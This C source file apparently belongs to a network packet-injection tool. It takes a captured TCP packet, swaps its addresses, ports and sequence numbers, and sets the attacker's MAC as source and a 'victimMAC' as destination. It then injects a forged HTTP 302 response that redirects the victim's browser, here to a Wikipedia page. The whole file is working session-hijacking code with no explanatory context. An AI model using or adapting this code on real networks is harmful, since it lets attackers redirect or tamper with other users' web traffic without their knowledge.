#include "myHeader.h"
#include <string.h>
int swapMAC(PETHERNET_HEADER eth, PLANINFO LanInfo);
int swapIP2(u_char* src, u_char* dst);
int swapPort(u_short* src, u_short* dst);
int swapSeqAck(u_int* seq, u_int* ack);

int packet302Redirect(u_char* sendPacket, const u_char* packet, PLANINFO LanInfo)
{
	PETHERNET_HEADER eth;
	PIP_HEADER ip;
	PTCP_HEADER tcp;
	const char msgBackward[128] = "HTTP/1.1 302 Found\r\nLocation: http://en.wikipedia.org/wiki/HTTP_302\r\n";
	u_short msgBackwardLen = (u_short)strlen(msgBackward);
	/* copy */
	memcpy(sendPacket, packet, TCP_PACKET_SIZE);
	eth = (PETHERNET_HEADER)sendPacket;
	ip = (PIP_HEADER)(sendPacket + ETHERNET_HEADER_SIZE);
	tcp = (PTCP_HEADER)((char*)ip + IP_HEADER_SIZE);
	memcpy((char*)tcp + TCP_HEADER_SIZE, msgBackward, msgBackwardLen);
	/* swap */
	swapMAC(eth, LanInfo);
	swapIP2(ip->sourceIP, ip->destinationIP);
	swapPort(&tcp->sourcePort, &tcp->destinationPort);
	swapSeqAck(&tcp->seq, &tcp->ack);
	/* set header */
	ip->ttl = 128;
	tcp->ack = htonl(ntohl(tcp->ack) + ntohs(ip->totalLen) - IP_HEADER_SIZE - TCP_HEADER_SIZE); /* acknowlegment number */
	ip->totalLen = htons(IP_HEADER_SIZE + TCP_HEADER_SIZE + msgBackwardLen);
	tcp->flags = TH_FIN | TH_ACK;
	tcp->window = 0;
	/* set checksum */
	ip->checksum = checksum_ip(ip);
	tcp->checksum = checksum_tcp(ip, tcp, TCP_HEADER_SIZE + msgBackwardLen);
	printf("backward end\n");
	return msgBackwardLen + TCP_PACKET_SIZE;
}
int swapMAC(PETHERNET_HEADER eth, PLANINFO LanInfo)
{
	memcpy(eth->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(eth->dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	return 0;
}
int swapIP2(u_char* src, u_char* dst)
{
	u_char temp[4];
	memcpy(temp, dst, 4);
	memcpy(dst, src, 4);
	memcpy(src, temp, 4);
	return 0;
}
int swapPort(u_short * src, u_short * dst)
{
	u_short temp = *src;
	*src = *dst;
	*dst = temp;
	return 0;
}
int swapSeqAck(u_int* seq, u_int* ack)
{
	u_int temp = *seq;
	*seq = *ack;
	*ack = temp;
	return 0;
}